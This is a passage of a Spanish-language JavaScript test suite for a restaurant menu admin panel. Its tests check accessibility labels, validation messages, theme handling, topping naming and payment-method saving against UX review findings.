				classList: { add: c => n.clases.add(c), remove: c => n.clases.delete(c) },
				setAttribute(k, v) { n.atributos[k] = String(v); }, removeAttribute(k) { delete n.atributos[k]; },
				focus() { n.enfocado++; }, addEventListener() {},
				// Como un navegador: insertar dos veces deja DOS elementos, aunque tengan
				// el mismo id. Sin esto, un mensaje duplicado pasaba por uno solo.
				insertAdjacentElement(_, el) {
					n.despues = el; n.insertados.push(el); nodos[el.id] = el;
					el.remove = () => { n.insertados = n.insertados.filter(x => x !== el); if (nodos[el.id] === el) delete nodos[el.id]; n.despues = n.insertados.at(-1) || null; };
				},
			};
			return n;
		};
		for (const id of ['editNombre', 'editCategoria', 'editPrecioNum']) nodos[id] = nodo(id);
		return { nodos, document: { getElementById: id => nodos[id] || null, createElement: () => ({}) } };
	}

	test('cada campo con error se marca, se describe y el foco va al primero', () => {
		const { nodos, document } = dom();
		const ctx = cargar('index.html', 'function erroresDeFicha', 'function vigilarErroresFicha', { String, Number, document });
		ctx.pintarErroresFicha(ctx.erroresDeFicha({ categoria: '', nombre: 'Hamburguesa', precio: '' }));
		const cat = nodos.editCategoria, precio = nodos.editPrecioNum;
		assert.ok(cat.clases.has('con-error') && precio.clases.has('con-error'));
		assert.equal(nodos.editNombre.clases.has('con-error'), false);
		assert.equal(cat.atributos['aria-invalid'], 'true');
		assert.equal(cat.atributos['aria-describedby'], 'editCategoriaError');
		assert.match(cat.despues.textContent, /categoría/);
		assert.equal(cat.enfocado, 1, 'el foco no fue a la categoría, el primer campo con error');
		assert.equal(precio.enfocado, 0);
	});

	test('volver a validar no duplica los mensajes, y corregir un campo quita el suyo', () => {
		const { nodos, document } = dom();
		const ctx = cargar('index.html', 'function erroresDeFicha', 'function vigilarErroresFicha', { String, Number, document });
		const errores = ctx.erroresDeFicha({ categoria: '', nombre: '', precio: '1' });
		ctx.pintarErroresFicha(errores);
		ctx.pintarErroresFicha(errores);
		assert.equal(nodos.editNombre.insertados.length, 1, 'el mensaje del nombre salió dos veces');
		assert.equal(nodos.editCategoria.insertados.length, 1, 'el mensaje de la categoría salió dos veces');
		ctx.limpiarErrorDeCampo('editNombre');
		assert.equal(nodos.editNombre.clases.has('con-error'), false);
		assert.equal(nodos.editNombreError, undefined);
		assert.ok(nodos.editCategoriaError, 'limpiar un campo se llevó el error de otro');
	});

	test('saveProduct usa la validación, y al abrir la ficha no quedan errores de la anterior', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const guardar = src.match(/async function saveProduct\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(guardar, /pintarErroresFicha\(errores\)/);
		assert.doesNotMatch(guardar, /showToast\('Selecciona una categoría'/);
		for (const f of ['function openNewProductModal', 'function openEditProductModal']) {
			const i = src.indexOf(f);
			assert.match(src.slice(i, src.indexOf('\n}', i)), /limpiarErroresFicha\(\)/, `${f} no limpia los errores`);
		}
		assert.match(src.slice(src.indexOf('// ── ARRANQUE')), /vigilarErroresFicha\(\);/);
	});
});

describe('borrar dice qué borra', () => {
	// P6. Un 🗑 con title="Eliminar" y nada más, en una lista de cien filas.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
	test('el de cada plato y el de cada categoría llevan nombre accesible con el nombre', () => {
		assert.match(src, /delBtnMovil\.setAttribute\('aria-label',`Eliminar «\$\{p\.nombre\}»`\)/);
		assert.match(src, /delBtn\.setAttribute\('aria-label',`Eliminar la categoría «\$\{cat\.nombre\}»`\)/);
	});

	test('la fila de categoría pinta ese nombre de verdad', () => {
		const nodo = () => ({ className: '', textContent: '', style: {}, hijos: [], title: '', type: '', atributos: {},
			dataset: {}, appendChild(h) { this.hijos.push(h); return h; }, addEventListener() {}, setAttribute(k, v) { this.atributos[k] = String(v); } });
		const lista = nodo();
		const ctx = cargar('index.html', '// ── LA LÍNEA DE DATOS DE CADA CATEGORÍA', '// Muestra/oculta el campo de imagen', {
			state: { categorias: [{ id: 'c1', nombre: 'Bebidas' }], productos: [] },
			document: { getElementById: () => lista, createElement: nodo },
			categoriaVisibleAhora: () => true, describirHorario: () => '', moveCat() {}, openEditCatModal() {}, confirmDelete() {},
		});
		ctx.renderCatList();
		const borrar = lista.hijos[0].hijos[2].hijos[2];
		assert.equal(borrar.atributos['aria-label'], 'Eliminar la categoría «Bebidas»');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('cada categoría dice cuántos platos tiene, cómo se ve y si sale en la carta', () => {
	// C2 y C3 en docs/revision-ux.md. «3 productos · fotos» no decía qué era
	// «fotos», y una categoría que la carta no enseña se pintaba como las demás.
	const { datosDeCategoria } = cargar('index.html', 'function datosDeCategoria', 'function renderCatList', {});
	const plato = (disponible = true) => ({ disponible });

	test('el modo de presentación se dice con palabras', () => {
		assert.equal(datosDeCategoria([plato(), plato(), plato()], false).texto, '3 platos · con fotos');
		assert.equal(datosDeCategoria([plato()], true).texto, '1 plato · en lista, sin fotos');
	});

	test('sin platos, avisa de que no sale en la carta', () => {
		// La carta la salta: core/menu.js, if (!prods.length) return.
		const d = datosDeCategoria([], false);
		assert.match(d.aviso, /no sale en la carta/);
	});

	test('con platos pero ninguno disponible, tampoco sale, y lo dice', () => {
		// La carta solo carga los disponibles (loader.js, disponible=eq.true), así
		// que para ella esta categoría está vacía. El hallazgo no lo recogía.
		const d = datosDeCategoria([plato(false), plato(false)], false);
		assert.match(d.aviso, /ninguno disponible/);
		assert.match(d.texto, /^2 platos/);
	});

	test('con un solo plato disponible, sale y no avisa', () => {
		assert.equal(datosDeCategoria([plato(false), plato(true)], false).aviso, null);
	});

	test('la fila pinta el aviso junto a los datos', () => {
		const nodo = () => ({ className: '', textContent: '', style: {}, hijos: [], title: '', type: '', atributos: {},
			dataset: {}, appendChild(h) { this.hijos.push(h); return h; }, addEventListener() {}, setAttribute(k, v) { this.atributos[k] = String(v); } });
		const lista = nodo();
		const ctx = cargar('index.html', '// ── LA LÍNEA DE DATOS DE CADA CATEGORÍA', '// Muestra/oculta el campo de imagen', {
			state: { categorias: [{ id: 'c1', nombre: 'Otros' }], productos: [] },
			document: { getElementById: () => lista, createElement: nodo },
			categoriaVisibleAhora: () => true, describirHorario: () => '', moveCat() {}, openEditCatModal() {}, confirmDelete() {},
		});
		ctx.renderCatList();
		const meta = lista.hijos[0].hijos[1].hijos[1];
		assert.equal(meta.textContent, 'Sin platos');
		assert.match(meta.hijos[0].textContent, /no sale en la carta/);
		assert.equal(meta.hijos[0].style.cssText.includes('var(--warn)'), true);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('los grupos de toppings se llaman igual en la pestaña y en la ficha', () => {
	// TP1 en docs/revision-ux.md: «Platino/Premium» en la pestaña y «sin costo/con
	// costo» en la ficha, y Platino sonaba a más que Premium siendo el gratis. La
	// carta del comensal dice «TOPPINGS PLATINO», así que ese nombre se conserva
	// entre paréntesis: es el que el dueño ve publicado.
	const src = codigoDelPanel();

	test('los dos grupos llevan el mismo par de nombres en las dos pantallas', () => {
		const pestana = src.slice(src.indexOf('<!-- TAB TOPPINGS -->'), src.indexOf('id="listToppingsSalsas"'));
		const ficha = src.slice(src.indexOf('id="persPlatinoWrap"'), src.indexOf('id="persPremiumChips"'));
		for (const [claro, carta_] of [['sin costo', 'Platino'], ['con costo', 'Premium']]) {
			assert.match(pestana, new RegExp(`Toppings ${claro}[^<]*<span[^>]*>\\(en la carta: «Toppings ${carta_}»\\)`), `la pestaña no dice «${claro}» con su nombre de carta`);
			assert.match(ficha, new RegExp(`Toppings ${claro} \\(${carta_}\\)`), `la ficha no dice «${claro} (${carta_})»`);
		}
	});

	// Que la carta diga «TOPPINGS PLATINO» y «TOPPINGS PREMIUM» se comprobó a mano
	// el 13/09/2026 en vmenus-app/index.html. No se prueba desde aquí: en CI solo
	// se clona este repositorio, y una prueba que lee el otro fallaría allí.

	test('el título de la ventana de añadir usa el nombre claro', () => {
		assert.match(src, /platino: 'Nuevo topping sin costo', premium: 'Nuevo topping con costo'/);
	});
});

describe('la pestaña de toppings vacía explica para qué sirve', () => {
	// TP2: tres «Sin elementos» y nada que dijera que un topping no sale en
	// ninguna carta hasta que un plato lo ofrece.
	function montar(catalogo) {
		const nodos = {};
		const nodo = () => ({ style: {}, innerHTML: '', appendChild() {}, querySelector: () => ({}) });
		const ctx = cargar('toppings.js', 'function renderToppingList', 'const CONTENEDOR_TOPPING', {
			toppingState: catalogo, esc: x => x, Number,
			document: { getElementById: id => (nodos[id] ||= nodo()), createElement: nodo },
		});
		const guia = cargar('toppings.js', '// La guía sale mientras el catálogo esté entero vacío', 'function renderToppingList', {
			toppingState: catalogo, document: { getElementById: id => (nodos[id] ||= nodo()) },
		});
		vm.runInContext('pintarGuiaToppings = globalThis.__guia;', Object.assign(ctx, { __guia: guia.pintarGuiaToppings }));
		return { ctx, nodos, guia };
	}

	test('con el catálogo vacío sale la guía, y cada lista dice qué hacer', () => {
		const { ctx, nodos } = montar({ platino: [], premium: [], salsas: [] });
		ctx.renderToppingList('listToppingsPlatino', 'platino');
		assert.equal(nodos.toppingsGuia.style.display, 'block');
		assert.match(nodos.listToppingsPlatino.innerHTML, /Pulsa «\+ Añadir»/);
		assert.doesNotMatch(nodos.listToppingsPlatino.innerHTML, /Sin elementos/);
	});

	test('en cuanto hay uno, la guía se va', () => {
		const catalogo = { platino: [{ id: 't1', nombre: 'Queso' }], premium: [], salsas: [] };
		const { ctx, nodos } = montar(catalogo);
		ctx.renderToppingList('listToppingsPlatino', 'platino');
		assert.equal(nodos.toppingsGuia.style.display, 'none');
	});

	test('la guía dice que el topping se asigna en la ficha del plato', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const guia = src.match(/<div id="toppingsGuia"[^>]*>([\s\S]*?)<\/div>/)[1];
		assert.match(guia, /ficha de cada plato/);
		assert.match(guia, /no sale en la carta hasta que algún plato lo ofrece/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el login: textos claros y la vista clara del sistema', () => {
	// L3, L4 y L5 en docs/revision-ux.md.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	test('la etiqueta habla del restaurante, no de un «identificador de acceso»', () => {
		assert.match(src, /<label for="slugInput" class="login-label">Nombre corto de tu restaurante<\/label>/);
		// Sin comentarios: el que explica este cambio cita el texto viejo.
		const visible = src.replace(/<!--[\s\S]*?-->/g, '').replace(/\/\/.*$/gm, '');
		assert.doesNotMatch(visible, /Identificador de acceso/);
		// Y el error de dejarlo vacío habla igual que la etiqueta.
		assert.doesNotMatch(visible, /Ingresa el identificador/);
		assert.match(visible, /textContent='Escribe el nombre corto de tu restaurante'/);
	});

	test('el PIN vacío no parece traer algo escrito', () => {
		const pin = src.match(/<input[^>]*id="pinInput"[\s\S]*?>/)[0];
		assert.doesNotMatch(pin, /placeholder="[·•*.]+"/);
	});

	// ── L5: el tema inicial, con el script real del <head> ──
	const scriptTema = (() => {
		const i = src.indexOf("const elegido = localStorage.getItem('menuAdminTemaElegido');");
		assert.ok(i > 0, 'no se encontró el script de tema del <head>');
		const ini = src.lastIndexOf('try {', i), fin = src.indexOf('} catch (e) {}', i) + '} catch (e) {}'.length;
		return src.slice(ini, fin);
	})();
	function temaAlCargar({ elegido = null, antiguo = null, sistemaClaro = false }) {
		let tema = null;
		const guardado = { menuAdminTemaElegido: elegido, menuAdminTema: antiguo };
		vm.runInNewContext(scriptTema, {
			localStorage: { getItem: k => guardado[k] ?? null },
			window: { matchMedia: q => ({ matches: q.includes('light') && sistemaClaro }) },
			document: { documentElement: { setAttribute: (k, v) => { if (k === 'data-theme') tema = v; } } },
		});
		return tema || 'dark';
	}

	test('sin nada elegido, sigue al sistema', () => {
		assert.equal(temaAlCargar({ sistemaClaro: true }), 'light');
		assert.equal(temaAlCargar({ sistemaClaro: false }), 'dark');
	});

	test('lo elegido con el botón manda sobre el sistema', () => {
		assert.equal(temaAlCargar({ elegido: 'dark', sistemaClaro: true }), 'dark');
		assert.equal(temaAlCargar({ elegido: 'light', sistemaClaro: false }), 'light');
	});

	test('el «oscuro» que el panel guardaba solo, sin elegirlo, ya no tapa al sistema', () => {
		// Es el caso de casi todo el que había entrado alguna vez: la carga
		// guardaba el tema por defecto.
		assert.equal(temaAlCargar({ antiguo: 'dark', sistemaClaro: true }), 'light');
	});

	test('un «claro» antiguo sí fue una elección, y se respeta', () => {
		assert.equal(temaAlCargar({ antiguo: 'light', sistemaClaro: false }), 'light');
	});

	test('cargar la página no guarda nada; solo el botón guarda', () => {
		const guardados = [];
		const ctx = cargar('index.html', 'function aplicarTema', 'function temaActual', {
			localStorage: { setItem: (k, v) => guardados.push([k, v]) },
			document: { documentElement: { setAttribute() {}, removeAttribute() {} }, querySelectorAll: () => [] },
		});
		ctx.aplicarTema('dark', { guardar: false });
		assert.deepEqual(guardados, []);
		ctx.aplicarTema('light');
		assert.deepEqual(guardados, [['menuAdminTemaElegido', 'light']]);
		assert.match(src, /aplicarTema\(temaActual\(\), \{ guardar: false \}\);/);
	});

	test('el botón de tema está también en el login', () => {
		const login = src.slice(src.indexOf('<div id="loginScreen"'), src.indexOf('<div class="login-box">'));
		assert.match(login, /class="btn-sm btn-tema" onclick="toggleTema\(\)"/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la lista del superadmin: el rojo solo para eliminar, y el estado no parece un botón', () => {
	// S2 y S3 en docs/revision-ux.md.
	const src = codigoDelPanel();

	function pintarLista(restos) {
		const tarjetas = [];
		const nodo = () => {
			const n = { hijos: [], style: {}, className: '', textContent: '', innerHTML: '', dataset: {},
				appendChild(h) { this.hijos.push(h); return h; } };
			n.querySelector = () => (n._acciones ||= { hijos: [], appendChild(h) { this.hijos.push(h); return h; } });
			return n;
		};
		const lista = { innerHTML: '', appendChild(c) { tarjetas.push(c); } };
		const ctx = cargar('index.html', 'async function cargarListaRestos', '// Encender o apagar la generación con IA', {
			document: {
				getElementById: id => (id === 'adminRestoList' ? lista : { innerHTML: '', appendChild() {} }),
				createElement: nodo,
			},
			apiFetch: async ruta => null, state: {},
			esc: x => String(x), fichaEntornoHtml: () => '', estadoPagoHtml: () => '', avisoPedidosHtml: () => '',
			fichaPlanHtml: () => '', resumenVideoHtml: () => '', facturacionDe: () => null,
			urlPublica: () => 'https://x', planDe: () => ({}),
			toggleSuspension() {}, entrarARestaurante() {}, cambiarPin() {}, marcarComoPagado() {}, eliminarRestaurante() {},
			Promise, String,
		});
		// apiFetch devuelve los restaurantes solo en su ruta; el resto, vacío.
		ctx.apiFetch = async (metodo, ruta) => (ruta === '/api/restaurantes' ? restos : ruta === '/api/facturacion' ? [] : {});
		vm.runInContext('apiFetch = globalThis.apiFetch;', ctx);
		return { ctx, tarjetas };
	}

	test('Eliminar es el único rojo; Suspender no lo es', async () => {
		const { ctx, tarjetas } = pintarLista([{ id: 'r1', nombre: 'Bonzas', slug: 'bonzas', activo: true }]);
		await ctx.cargarListaRestos();
		const botones = tarjetas[0]._acciones.hijos;
		const por = texto => botones.find(b => b.textContent === texto);
		assert.match(por('Eliminar').className, /\beliminar\b/);
		assert.doesNotMatch(por('Suspender').className, /\b(danger|eliminar)\b/);
		assert.match(por('Suspender').className, /\bsuspender\b/);
	});

	test('el rojo de eliminar se ve sin pasar el ratón, y el de suspender es ámbar', () => {
		assert.match(src, /\.btn-sm\.eliminar\{border-color:var\(--danger\);color:var\(--danger\);\}/);
		assert.match(src, /\.btn-sm\.suspender:hover\{border-color:var\(--warn\);color:var\(--warn\);\}/);
	});

	test('el estado va junto al nombre y fuera de la fila de botones', async () => {
		const { ctx, tarjetas } = pintarLista([
			{ id: 'r1', nombre: 'Bonzas', slug: 'bonzas', activo: true },
			{ id: 'r2', nombre: 'Gale', slug: 'gale', activo: false },
		]);
		await ctx.cargarListaRestos();
		assert.match(tarjetas[0].innerHTML, /<div class="resto-card-name">Bonzas<span class="resto-estado activo">Activo<\/span><\/div>/);
		assert.match(tarjetas[1].innerHTML, /<span class="resto-estado suspendido">Suspendido<\/span>/);
		assert.match(tarjetas[0].innerHTML, /<div class="resto-card-actions"><\/div>/, 'el estado sigue dentro de la fila de botones');
	});

	test('el estado no tiene caja: ni borde ni fondo', () => {
		const regla = src.match(/\.resto-estado\{[^}]*\}/)[0];
		assert.doesNotMatch(regla, /border|background|padding/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('si la lista de restaurantes no carga, se dice por qué y se puede reintentar', () => {
	// S5 en docs/revision-ux.md: «Error cargando restaurantes», sin motivo ni botón.
	const nodo = () => {
		const n = { className: '', textContent: '', type: '', onclick: null, hijos: [], innerHTML: '', style: {}, dataset: {},
			appendChild(h) { this.hijos.push(h); return h; } };
		n.querySelector = () => (n._dentro ||= nodo());
		return n;
	};

	function montar(apiFetch) {
		const lista = nodo();
		const otros = {};
		let reintentos = 0;
		const ctx = cargar('index.html', 'async function cargarListaRestos', '// Encender o apagar la generación con IA', {
			// La lista es un nodo y el desplegable de «clonar» otro: si fueran el
			// mismo, sus opciones se mezclarían con las tarjetas.
			document: { getElementById: id => (id === 'adminRestoList' ? lista : (otros[id] ||= nodo())), createElement: nodo },
			apiFetch, state: {}, Promise, String, TypeError,
		});
		return { ctx, lista, reintentos: () => reintentos, contar: () => { reintentos++; } };
	}

	test('sin red se dice que no hay conexión, no «Failed to fetch»', async () => {
		const { ctx, lista } = montar(async () => { throw new TypeError('Failed to fetch'); });
		await ctx.cargarListaRestos();
		const caja = lista.hijos[0];
		const motivo = caja.hijos.find(h => h.textContent.includes('conexión'));
		assert.ok(motivo, 'no dice que falta la conexión');
		assert.equal(caja.hijos.some(h => /Failed to fetch/.test(h.textContent)), false);
	});

	test('un error del servidor enseña su mensaje', async () => {
		const { ctx, lista } = montar(async () => { throw new Error('El servidor respondió 502 sin explicación'); });
		await ctx.cargarListaRestos();
		assert.ok(lista.hijos[0].hijos.some(h => /502/.test(h.textContent)));
	});

	test('el botón vuelve a pedir la lista, y si ya funciona la pinta', async () => {
		let falla = true;
		const restos = [{ id: 'r1', nombre: 'Bonzas', slug: 'bonzas', activo: true }];
		const { ctx, lista } = montar(async (m, ruta) => {
			if (falla) throw new TypeError('Failed to fetch');
			return ruta === '/api/restaurantes' ? restos : ruta === '/api/facturacion' ? [] : {};
		});
		Object.assign(ctx, {
			esc: String, fichaEntornoHtml: () => '', estadoPagoHtml: () => '', avisoPedidosHtml: () => '',
			fichaPlanHtml: () => '', resumenVideoHtml: () => '', facturacionDe: () => null, urlPublica: () => '', planDe: () => ({}),
		});
		await ctx.cargarListaRestos();
		const boton = lista.hijos[0].hijos.find(h => h.textContent === 'Reintentar');
		assert.ok(boton, 'no hay botón de reintentar');
		falla = false;
		lista.hijos = [];
		await boton.onclick();
		assert.equal(lista.hijos.length, 1);
		assert.match(lista.hijos[0].innerHTML, /Bonzas/, 'reintentar no volvió a pintar la lista');
	});

	test('el motivo se pinta como texto: puede venir del servidor', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const cuerpo = src.match(/function pintarErrorLista\(list, e\) \{[\s\S]*?\n\}/)[0];
		assert.match(cuerpo, /motivo\.textContent = motivoDeError\(e\)/);
		assert.doesNotMatch(cuerpo, /innerHTML\s*=\s*[^'"]*motivo/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('crear un restaurante lleva a él', () => {
	// F4 en docs/revision-ux.md: «✓ Restaurante creado» y el nuevo quedaba el
	// último de la lista, 1.552 px por debajo de lo que se veía.
	function montar(slugs) {
		const tarjetas = slugs.map(slug => {
			const clases = new Set();
			return { dataset: { slug }, vista: 0, clases,
				classList: { add: c => clases.add(c), remove: c => clases.delete(c) },
				scrollIntoView() { this.vista++; } };
		});
		const avisos = [], entradas = [], temporizadores = [];
		const ctx = cargar('index.html', '// F4 en docs/revision-ux.md', 'function cambiarPin', {
			document: { querySelectorAll: sel => (sel === '#adminRestoList .resto-card' ? tarjetas : []) },
			showToast: (msg, tipo, accion) => avisos.push({ msg, tipo, accion }),
			entrarARestaurante: slug => entradas.push(slug),
			setTimeout: fn => temporizadores.push(fn),
		});
		return { ctx, tarjetas, avisos, entradas, temporizadores };
	}

	test('trae a la vista la tarjeta del nuevo y la señala un momento', () => {
		const { ctx, tarjetas, temporizadores } = montar(['bonzas', 'gale', 'zz-nuevo']);
		ctx.llevarARestauranteNuevo('zz-nuevo', 'Nuevo');
		assert.equal(tarjetas[2].vista, 1);
		assert.equal(tarjetas[0].vista, 0);
		assert.ok(tarjetas[2].clases.has('recien-creado'));
		temporizadores.forEach(fn => fn());
		assert.equal(tarjetas[2].clases.has('recien-creado'), false, 'el resaltado no se va solo');
	});

	test('el aviso ofrece montar la carta, y lleva a ese restaurante', () => {
		const { ctx, avisos, entradas } = montar(['zz-nuevo']);
		ctx.llevarARestauranteNuevo('zz-nuevo', 'Pizzería Italiana');
		assert.match(avisos[0].msg, /Pizzería Italiana/);
		assert.equal(avisos[0].accion.texto, 'Montar la carta');
		avisos[0].accion.alPulsar();
		assert.deepEqual(entradas, ['zz-nuevo']);
	});

	test('si la tarjeta no está, el aviso sale igual', () => {
		const { ctx, avisos } = montar([]);
		assert.doesNotThrow(() => ctx.llevarARestauranteNuevo('zz-nuevo', 'Nuevo'));
		assert.equal(avisos.length, 1);
	});

	test('crear la usa después de recargar la lista, y cada tarjeta lleva su slug', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const crear = src.match(/async function crearRestaurante\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(crear, /await cargarListaRestos\(\);[\s\S]{0,200}?llevarARestauranteNuevo\(slug, nombre\);/);
		assert.match(src, /card\.className='resto-card'; card\.dataset\.slug=r\.slug;/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la insignia de pedidos dice lo que la carta tiene, no lo que el plan permite', () => {
	// X1 en docs/revision-ux.md. Todos los planes incluyen carrito, así que salía
	// «🛒 pedidos» en los once restaurantes; Bonzas la llevaba siendo Topnav, sin
	// carrito y sin pestaña Pedidos.
	const ctx = cargar('index.html', [
		['const PLANES', '// En qué proporción se recorta el video'],
		['function fichaPlanHtml', 'function resumenVideoHtml'],
	], { String, state: { resumenVideo: {} }, esc: String, etiquetaModelo: String });
	const pedidos = atributos => (ctx.fichaPlanHtml({ id: 'r', atributos }).match(/🛒[^<]*/) || [null])[0];

	// Los casos son los de producción el 13/09/2026.
	test('modelo Carrito: pedidos, aunque el interruptor esté apagado (aojocerrado, perroscriollos)', () => {
		assert.equal(pedidos({ nav: 'carrito', plan: 'completo', carrito: false }), '🛒 pedidos');
	});

	test('Video o Vertical con el interruptor puesto: pedidos (indigo, voro)', () => {
		assert.equal(pedidos({ nav: 'vertical', plan: 'video', carrito: true }), '🛒 pedidos');
	});

	test('Video o Vertical con el interruptor apagado: lo dice apagado (juanmar, pierrot)', () => {
		assert.equal(pedidos({ nav: 'video', plan: 'video', carrito: false }), '🛒 pedidos apagados');
	});

	test('Topnav, Sidebar y Explorar no lo nombran: no hay interruptor que encender (bonzas)', () => {
		for (const nav of ['topnav', 'sidebar', 'explorar', null]) {
			assert.equal(pedidos({ nav, plan: 'completo', carrito: false }), null, `${nav} lleva la insignia`);
		}
	});
});

describe('cambiar de restaurante empieza arriba', () => {
	// X2: entrando a Bonzas desde la lista se aterrizaba a mitad de su tabla de
	// productos, a la altura que tenía la lista.
	test('entrar y volver llevan la página arriba', () => {
		const llamadas = [];
		const ctx = cargar('index.html', 'function entrarARestaurante', 'function volverAlAdmin', {
			state: {}, sessionStorage: { setItem() {} },
			document: { getElementById: () => ({ style: {} }) },
			window: { scrollTo: (x, y) => llamadas.push([x, y]) }, enterApp() {},
		});
		ctx.entrarARestaurante('bonzas');
		assert.deepEqual(llamadas, [[0, 0]]);
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const volver = src.match(/function volverAlAdmin\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(volver, /window\.scrollTo\(0, 0\);\s*enterAdmin\(\);/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('los avisos de la dirección del menú no se contradicen', () => {
	// A5 en docs/revision-ux.md: «no responderá hasta que lo registres» y, 8 px
	// debajo, «las dos formas funcionan siempre». Comprobado el 13/09/2026:
	// menu.vmenus.co/bonzas da 200 y bonzas.vmenus.co, sin registrar, 404.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
	const seccion = src.slice(src.indexOf('<div class="section-title">Dirección del menú</div>'), src.indexOf('<div class="section-title">Zona horaria</div>'));
	const visible = seccion.replace(/<!--[\s\S]*?-->/g, '');

	test('ya no afirma que las dos formas funcionen siempre', () => {
		assert.doesNotMatch(visible, /dos formas funcionan siempre/);
		assert.match(visible, /forma de ruta \(menu\.vmenus\.co\/nombre\) responde siempre/);
	});

	test('el aviso del subdominio dice que se compruebe antes del QR', () => {
		assert.match(visible, /comprueba que carga <strong>antes<\/strong> de imprimir el QR/);
	});

	test('la dirección es un enlace que se puede abrir', () => {
		const campos = {};
		const $ = id => (campos[id] ||= { value: 'subdominio', textContent: '', href: '', style: {} });
		const ctx = cargar('index.html', 'function renderUrlPublicaPreview', '// ── ', {
			document: { getElementById: $ },
			state: { restaurante: { slug: 'bonzas' } },
			urlPublica: (r, modo) => (modo === 'subdominio' ? `https://${r.slug}.vmenus.co` : `https://menu.vmenus.co/${r.slug}`),
		});
		ctx.renderUrlPublicaPreview();
		assert.equal($('apUrlPreview').href, 'https://bonzas.vmenus.co');
		assert.equal($('apUrlAviso').style.display, 'block');
		assert.match(seccion, /<a id="apUrlPreview" target="_blank" rel="noopener noreferrer"/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la pestaña Pedidos se guarda de una vez', () => {
	// PE2 en docs/revision-ux.md: «Guardar» para el número y «Guardar métodos de
	// pago» para lo demás. Los dos van a restaurantes.atributos: una petición.
	const src = codigoDelPanel();

	function montar({ whatsapp = '573001234567', nequi = { activo: false, telefono: '', titular: '' } } = {}) {
		const campos = {
			pedidosWhatsapp: { value: whatsapp }, mpEfectivo: { checked: true }, mpTarjeta: { checked: false },
			mpNequiActivo: { checked: nequi.activo }, mpNequiTelefono: { value: nequi.telefono }, mpNequiTitular: { value: nequi.titular },
			mpDaviplataActivo: { checked: false }, mpDaviplataTelefono: { value: '' }, mpDaviplataTitular: { value: '' },
			mpBancolombiaActivo: { checked: false }, mpBancolombiaNumero: { value: '' }, mpBancolombiaTipo: { value: 'ahorros' }, mpBancolombiaTitular: { value: '' },
			mpBrebActivo: { checked: false }, mpBrebLlave: { value: '' },
		};
		const $ = id => (campos[id] ||= { value: '', checked: false, textContent: '', style: {} });
		const peticiones = [], avisos = [];
		const ctx = cargar('index.html', 'function recolectarMetodosPago', '// ── FUNCIONES SUPERADMIN', {
			document: { getElementById: $ }, state: { restaurante: { id: 'r1', atributos: {} } },
			apiFetch: async (metodo, ruta, cuerpo) => { peticiones.push({ metodo, ruta, cuerpo }); return { id: 'r1', atributos: cuerpo.atributos }; },
			actualizarAvisoPedidos() {}, showToast: (m, t) => avisos.push({ m, t }),
		});
		return { ctx, $, peticiones, avisos };
	}

	test('un solo botón de guardar en la pestaña, y ya no existe el segundo guardado', () => {
		const pestana = src.slice(src.indexOf('<div id="tabPedidos"'), src.indexOf('<div id="tabTv"') > 0 ? src.indexOf('<div id="tabTv"') : undefined);
		assert.equal((pestana.match(/class="btn-save"/g) || []).length, 1);
		assert.doesNotMatch(src, /function saveMetodosPago|onclick="saveMetodosPago\(\)"/);
	});

	test('guardar manda el número y los métodos en la misma petición', async () => {
		const { ctx, peticiones } = montar();
		await ctx.savePedidos();
		assert.equal(peticiones.length, 1);
		assert.deepEqual(Object.keys(peticiones[0].cuerpo.atributos).sort(), ['metodos_pago', 'whatsapp_pedidos']);
		assert.equal(peticiones[0].cuerpo.atributos.whatsapp_pedidos, '573001234567');
		assert.equal(peticiones[0].cuerpo.atributos.metodos_pago.efectivo.activo, true);
	});

	test('un método activo sin datos no deja guardar nada, y lo dice', async () => {
		const { ctx, $, peticiones } = montar({ nequi: { activo: true, telefono: '', titular: '' } });
		await ctx.savePedidos();
		assert.equal(peticiones.length, 0);
		assert.equal($('pedidosStatus').textContent, 'Faltan los datos de Nequi');
	});

	test('sin número tampoco, y dice qué falta; si faltan las dos cosas, las dos', () => {
		const { ctx } = montar();
		const mpVacio = { nequi: {}, daviplata: {}, bancolombia: {}, breb: {} };
		assert.deepEqual([...ctx.erroresDePedidos('', mpVacio)], ['el número de WhatsApp']);
		const errores = ctx.erroresDePedidos('', { ...mpVacio, breb: { activo: true, llave: '' } });
		assert.equal(errores.length, 2);
		assert.match(errores[1], /Bre-B/);
	});

	test('guardar sigue reevaluando el aviso de «no recibe pedidos»', () => {
		const cuerpo = src.match(/async function savePedidos\(\)\s*\{[\s\S]*?\n\}/)[0];
		assert.match(cuerpo, /actualizarAvisoPedidos\(\)/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el carril de categorías avisa de que hay más, y la rueda no se acelera', () => {
	// P5 en docs/revision-ux.md: 21 categorías y 8 a la vista, sin aviso.
	const src = codigoDelPanel();

	test('el carril difumina su borde como las pestañas', () => {
		assert.match(src, /\.tabs\.hay-mas-derecha,\.cat-filter\.hay-mas-derecha\{/);
		assert.match(src, /\.tabs\.hay-mas-izquierda,\.cat-filter\.hay-mas-izquierda\{/);
	});

	test('marcarBordes sirve para cualquier carril', () => {
		const clases = new Set();
		const carril = { scrollLeft: 0, clientWidth: 862, scrollWidth: 2321,
			classList: { toggle: (c, on) => (on ? clases.add(c) : clases.delete(c)) } };
		const ctx = cargar('index.html', 'function bordesConContenido', 'function marcarBordesDeTabs', {});
		ctx.marcarBordes(carril);
